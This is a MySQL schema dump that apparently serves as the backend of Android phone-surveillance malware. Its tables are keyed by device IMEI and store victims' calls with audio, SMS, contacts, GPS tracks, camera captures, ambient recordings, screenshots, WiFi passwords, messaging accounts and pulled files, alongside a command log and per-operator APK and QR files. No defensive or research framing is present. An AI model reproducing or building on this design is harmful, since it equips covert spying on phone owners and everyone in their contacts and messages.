/*
Navicat MySQL Data Transfer

Source Server         : localhost
Source Server Version : 50505
Source Host           : localhost:3306
Source Database       : phmm

Target Server Type    : MYSQL
Target Server Version : 50505
File Encoding         : 65001

Date: 2019-07-07 23:33:25
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for client_log
-- ----------------------------
DROP TABLE IF EXISTS 'client_log';
CREATE TABLE 'client_log' (
  'client_id' int(11) DEFAULT NULL,
  'ts' int(11) DEFAULT NULL,
  'type' tinyint(4) DEFAULT '0' COMMENT '0: system info\r\n1: system error\r\n10: normal info\r\n11: normal error',
  'log' text,
  KEY 'client' ('client_id','ts')
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for cmd_log
-- ----------------------------
DROP TABLE IF EXISTS 'cmd_log';
CREATE TABLE 'cmd_log' (
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'client_id' int(11) NOT NULL,
  'ts' int(11) DEFAULT NULL,
  'log' text,
  PRIMARY KEY ('id'),
  KEY 'client_id' ('client_id','ts') USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=1720 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for phone_clients
-- ----------------------------
DROP TABLE IF EXISTS 'phone_clients';
CREATE TABLE 'phone_clients' (
  'target' int(11) NOT NULL DEFAULT '0',
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'imei' varchar(50) NOT NULL,
  'name' varchar(50) DEFAULT NULL,
  'update_ts' int(11) DEFAULT NULL,
  'model' varchar(255) DEFAULT NULL,
  'state' tinyint(4) DEFAULT '1' COMMENT '1：正常\r\n0：销毁',
  'infos' text,
  'group' int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY ('id'),
  UNIQUE KEY 'imei' ('imei') USING BTREE,
  KEY 'target' ('target') USING BTREE,
  KEY 'id' ('id')
) ENGINE=InnoDB AUTO_INCREMENT=493 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_applist
-- ----------------------------
DROP TABLE IF EXISTS 'ph_applist';
CREATE TABLE 'ph_applist' (
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'client_id' int(11) NOT NULL,
  'name' varchar(100) DEFAULT NULL,
  'package' varchar(255) DEFAULT NULL,
  'version' varchar(50) DEFAULT NULL,
  'ctime' varchar(20) DEFAULT NULL,
  'utime' varchar(20) DEFAULT NULL,
  'type' tinyint(4) DEFAULT NULL COMMENT '1：安装应用\r\n2：系统应用',
  PRIMARY KEY ('id'),
  KEY 'client_id' ('client_id') USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=1433167 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_bookmark
-- ----------------------------
DROP TABLE IF EXISTS 'ph_bookmark';
CREATE TABLE 'ph_bookmark' (
  'client_id' int(11) NOT NULL,
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'url' text,
  'title' text,
  'count' int(11) DEFAULT NULL,
  'ctime' int(11) DEFAULT NULL,
  PRIMARY KEY ('id'),
  KEY 'client_id' ('client_id')
) ENGINE=InnoDB AUTO_INCREMENT=210 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_call_record
-- ----------------------------
DROP TABLE IF EXISTS 'ph_call_record';
CREATE TABLE 'ph_call_record' (
  'client_id' int(11) NOT NULL,
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'name' varchar(50) DEFAULT NULL,
  'number' varchar(30) DEFAULT NULL,
  'type' tinyint(4) DEFAULT NULL COMMENT '1：呼入\r\n2：呼出',
  'ts' int(1) DEFAULT NULL,
  'duration' int(1) DEFAULT NULL,
  'voice_file' varchar(255) DEFAULT NULL,
  PRIMARY KEY ('id'),
  KEY 'client_number' ('client_id','number','type')
) ENGINE=InnoDB AUTO_INCREMENT=86585 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_camera
-- ----------------------------
DROP TABLE IF EXISTS 'ph_camera';
CREATE TABLE 'ph_camera' (
  'client_id' int(11) NOT NULL,
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'ts' int(11) DEFAULT NULL,
  'type' tinyint(4) DEFAULT NULL COMMENT '0：前置\r\n1：后置',
  'img_file' varchar(255) DEFAULT NULL,
  PRIMARY KEY ('id'),
  KEY 'client_id' ('client_id')
) ENGINE=InnoDB AUTO_INCREMENT=263 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_client_info
-- ----------------------------
DROP TABLE IF EXISTS 'ph_client_info';
CREATE TABLE 'ph_client_info' (
  'client_id' int(11) NOT NULL,
  'type' tinyint(4) NOT NULL COMMENT '1: 手机型号\r\n2: 设备商标\r\n3: Android版本\r\n4: API版本\r\n5: 系统最近更新时间\r\n6: 产品名称\r\n7: 设备指纹\r\n8: 屏幕显示\r\n9: 设备制造商\r\n10: 序列号\r\n11: USER\r\n12: 设备ID\r\n13: 设备版本\r\n14: Kernel版本\r\n15: 基带版本\r\n16: cpu信息\r\n17: 总内存大小\r\n18: 可用内存大小\r\n19: 屏幕分辨率\r\n20: SD卡容量\r\n21: SD卡剩余容量\r\n22: 电池电量\r\n23: 充电电量\r\n24: 开机时间\r\n25: IMEI\r\n26: IMSI\r\n27: 手机号\r\n28: sim卡号\r\n29: sim卡状态\r\n30: 网络名称\r\n31: 网络类型\r\n32: 是否漫游 \r\n33: 数据连接状态\r\n34: 国家: \r\n35: 语音信箱 \r\n36: 运营商\r\n37: MAC地址\r\n38: IP地址\r\n39: 外网IP地址\r\n40: 当前连接的wifi名称',
  'value' text,
  PRIMARY KEY ('client_id','type'),
  KEY 'client_id' ('client_id')
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_contacts
-- ----------------------------
DROP TABLE IF EXISTS 'ph_contacts';
CREATE TABLE 'ph_contacts' (
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'client_id' int(11) NOT NULL,
  'name' varchar(30) DEFAULT NULL,
  'number' varchar(30) NOT NULL,
  PRIMARY KEY ('id'),
  KEY 'client_id' ('client_id') USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=833643 DEFAULT CHARSET=utf8mb4 COMMENT='通讯录人名';

-- ----------------------------
-- Table structure for ph_env_record
-- ----------------------------
DROP TABLE IF EXISTS 'ph_env_record';
CREATE TABLE 'ph_env_record' (
  'client_id' int(11) NOT NULL,
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'ts' int(11) DEFAULT NULL,
  'duration' int(11) DEFAULT NULL,
  'voice_file' varchar(255) DEFAULT NULL,
  PRIMARY KEY ('id'),
  KEY 'client_id' ('client_id')
) ENGINE=InnoDB AUTO_INCREMENT=166 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_files
-- ----------------------------
DROP TABLE IF EXISTS 'ph_files';
CREATE TABLE 'ph_files' (
  'client_id' int(11) NOT NULL,
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'type' tinyint(4) DEFAULT NULL,
  'name' varchar(200) DEFAULT NULL,
  'path' text,
  'size' int(11) DEFAULT NULL,
  PRIMARY KEY ('id'),
  KEY 'client_id' ('client_id','type') USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=85071 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_file_op
-- ----------------------------
DROP TABLE IF EXISTS 'ph_file_op';
CREATE TABLE 'ph_file_op' (
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'client_id' int(11) DEFAULT NULL,
  'fname' varchar(255) DEFAULT NULL,
  'op' tinyint(4) DEFAULT NULL COMMENT '1：读取\r\n2：修改\r\n3：创建\r\n4：删除',
  PRIMARY KEY ('id'),
  KEY 'client_id' ('client_id','id') USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_gps_info
-- ----------------------------
DROP TABLE IF EXISTS 'ph_gps_info';
CREATE TABLE 'ph_gps_info' (
  'client_id' int(11) NOT NULL,
  'ts' int(11) NOT NULL,
  'lat' float(10,5) DEFAULT NULL COMMENT '高德坐标系',
  'lon' float(10,5) DEFAULT NULL COMMENT '高德坐标系',
  'gps' varchar(50) DEFAULT NULL COMMENT '原始gps数据\r\n格式为  lat,lon',
  'addr' text,
  PRIMARY KEY ('client_id','ts'),
  KEY 'client_id' ('client_id')
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_group
-- ----------------------------
DROP TABLE IF EXISTS 'ph_group';
CREATE TABLE 'ph_group' (
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'gname' varchar(255) DEFAULT NULL,
  'uid' int(11) DEFAULT NULL,
  PRIMARY KEY ('id'),
  KEY 'uid' ('uid') USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_msg_record
-- ----------------------------
DROP TABLE IF EXISTS 'ph_msg_record';
CREATE TABLE 'ph_msg_record' (
  'client_id' int(11) NOT NULL,
  'mid' int(11) NOT NULL,
  'name' varchar(255) DEFAULT NULL,
  'number' varchar(30) DEFAULT NULL,
  'type' tinyint(4) DEFAULT NULL COMMENT '1：接收\r\n2：发送',
  'ts' int(11) DEFAULT NULL,
  'content' text,
  PRIMARY KEY ('client_id','mid'),
  KEY 'client_number' ('client_id','number')
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_proc
-- ----------------------------
DROP TABLE IF EXISTS 'ph_proc';
CREATE TABLE 'ph_proc' (
  'client_id' int(11) NOT NULL,
  'pid' int(11) NOT NULL,
  'name' varchar(255) DEFAULT NULL,
  'userid' int(11) DEFAULT NULL,
  PRIMARY KEY ('client_id','pid'),
  KEY 'client_id' ('client_id','name'(191))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_sd_files
-- ----------------------------
DROP TABLE IF EXISTS 'ph_sd_files';
CREATE TABLE 'ph_sd_files' (
  'client_id' int(11) NOT NULL,
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'parent' int(11) DEFAULT NULL,
  'type' tinyint(4) DEFAULT NULL COMMENT '0: dir\r\n1: file',
  'name' varchar(255) DEFAULT NULL,
  'size' int(11) DEFAULT NULL,
  'mtime' int(11) DEFAULT NULL,
  'path' text,
  PRIMARY KEY ('id'),
  KEY 'client_id' ('client_id','parent'),
  KEY 'parent' ('parent')
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_sd_files_local
-- ----------------------------
DROP TABLE IF EXISTS 'ph_sd_files_local';
CREATE TABLE 'ph_sd_files_local' (
  'client_id' int(11) NOT NULL,
  'sd_id' int(11) NOT NULL,
  'state' tinyint(4) DEFAULT NULL COMMENT '0：等待下载\r\n1：正在下载\r\n2：已完成\r\n3：下载失败',
  'name' varchar(255) DEFAULT NULL,
  'fullname' text,
  'file' varchar(255) DEFAULT NULL,
  'cmd_id' int(11) DEFAULT NULL COMMENT '对应的cmd的ID',
  'size' int(11) DEFAULT NULL,
  PRIMARY KEY ('sd_id'),
  KEY 'client' ('client_id')
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_snapshot
-- ----------------------------
DROP TABLE IF EXISTS 'ph_snapshot';
CREATE TABLE 'ph_snapshot' (
  'client_id' int(11) NOT NULL,
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'group' int(11) DEFAULT NULL,
  'ts' int(11) DEFAULT NULL,
  'img_file' varchar(255) DEFAULT NULL,
  PRIMARY KEY ('id'),
  KEY 'client_id' ('client_id','group') USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=182 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_web_record
-- ----------------------------
DROP TABLE IF EXISTS 'ph_web_record';
CREATE TABLE 'ph_web_record' (
  'client_id' int(11) NOT NULL,
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'ts' int(11) DEFAULT NULL,
  'url' text,
  'title' text,
  'count' int(11) DEFAULT NULL,
  'ctime' int(11) DEFAULT NULL,
  PRIMARY KEY ('id'),
  KEY 'client_id' ('client_id','ts')
) ENGINE=InnoDB AUTO_INCREMENT=234 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for ph_wifi_info
-- ----------------------------
DROP TABLE IF EXISTS 'ph_wifi_info';
CREATE TABLE 'ph_wifi_info' (
  'client_id' int(11) NOT NULL,
  'list' text,
  'password' text,
  PRIMARY KEY ('client_id'),
  KEY 'client_id' ('client_id')
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS 'users';
CREATE TABLE 'users' (
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'name' varchar(50) DEFAULT NULL,
  'pwd' varchar(100) DEFAULT NULL,
  'tname' varchar(50) DEFAULT NULL,
  'state' tinyint(4) DEFAULT '10',
  'apk_file' varchar(255) DEFAULT NULL,
  'qr_file' varchar(255) DEFAULT NULL,
  PRIMARY KEY ('id'),
  UNIQUE KEY 'name' ('name') USING BTREE,
  UNIQUE KEY 'tname' ('tname') USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=40 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Table structure for user_log
-- ----------------------------
DROP TABLE IF EXISTS 'user_log';
CREATE TABLE 'user_log' (
  'ts' int(11) NOT NULL,
  'uid' int(11) NOT NULL,
  'action' varchar(255) NOT NULL,
  KEY 'uid' ('uid','ts')
) ENGINE=InnoDB DEFAULT CHARSET=utf8;



-- ----------------------------
-- Table structure for ph_contacts
-- ----------------------------
DROP TABLE IF EXISTS 'ph_accounts';
CREATE TABLE 'ph_accounts' (
  'id' int(11) NOT NULL AUTO_INCREMENT,
  'client_id' int(11) NOT NULL,
  'qq' varchar(255) DEFAULT NULL,
  'wx' varchar(255) DEFAULT NULL,
  'skype' varchar(255) DEFAULT NULL,
  'telegram' varchar(255) DEFAULT NULL,
  'other' varchar(255) DEFAULT NULL,
  PRIMARY KEY ('id'),
  KEY 'client_id' ('client_id') USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=833643 DEFAULT CHARSET=utf8mb4 COMMENT='通讯录人名';


DROP TABLE IF EXISTS 'ph_wifi_info_2';
CREATE TABLE ph_wifi_info_2 (
  client_id int(11) NOT NULL,
  list MEDIUMTEXT,
  password MEDIUMTEXT,
  PRIMARY KEY (client_id),
  KEY client_id (client_id)
) DEFAULT CHARSET=utf8mb4;


DROP TABLE IF EXISTS pc_downloadfile;

CREATE TABLE ph_downloadfile (
  id int(11) NOT NULL AUTO_INCREMENT,
  client_id int(11) DEFAULT NULL,
  file_path text,
  PRIMARY KEY (id)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8;


DROP TABLE IF EXISTS pc_uploadfile;

CREATE TABLE ph_uploadfile (
  id int(11) NOT NULL AUTO_INCREMENT,
  client_id int(11) DEFAULT NULL COMMENT '客户端id',
  file_path text COMMENT '文件路径',
  PRIMARY KEY (id)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8;
